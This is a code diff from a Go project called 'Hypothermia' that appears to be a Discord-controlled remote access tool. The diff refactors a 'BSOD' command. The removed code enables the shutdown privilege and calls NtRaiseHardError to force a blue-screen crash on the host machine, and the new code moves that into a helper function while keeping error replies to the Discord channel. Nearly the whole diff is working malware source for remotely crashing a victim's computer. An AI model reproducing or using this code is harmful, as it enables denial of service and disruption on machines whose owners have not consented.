@@ -2,46 +2,28 @@ package commands
 
 import (
 	"fmt"
-	"syscall"
-	"unsafe"
 
+	"Hypothermia/src/funcs"
 	"Hypothermia/src/misc"
+
 	"github.com/bwmarrin/discordgo"
 )
 
-const bsodRaiseError string = "🟥 Failed to raise error: %s"
-
-var raiseHardError *syscall.LazyProc = misc.NTdll.NewProc("NtRaiseHardError")
+const bsodRaiseError string = "🟥 Failed to raise hard error: %s"
 
 func (*BSODCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
-	var old int32
-	var res uint32
-
-	ret, _, err := misc.AdjustPrivilege.Call(
-		uintptr(19),
-		uintptr(1),
-		uintptr(0),
-		uintptr(unsafe.Pointer(&old)),
-	)
-
-	if ret != 0 {
+	code, err := funcs.BlueScreen()
+	switch code {
+	case -2:
 		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.ERROR_F_ADJUST_PRIVILEGE, err), m.Reference())
 		return
-	}
 
-	ret, _, err = raiseHardError.Call(
-		uintptr(0xC000007B),
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-		uintptr(6),
-		uintptr(unsafe.Pointer(&res)),
-	)
-
-	if ret != 0 {
+	case -1:
 		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(bsodRaiseError, err), m.Reference())
 		return
 	}
+
+	// success
 }
 
 func (*BSODCommand) Name() string {
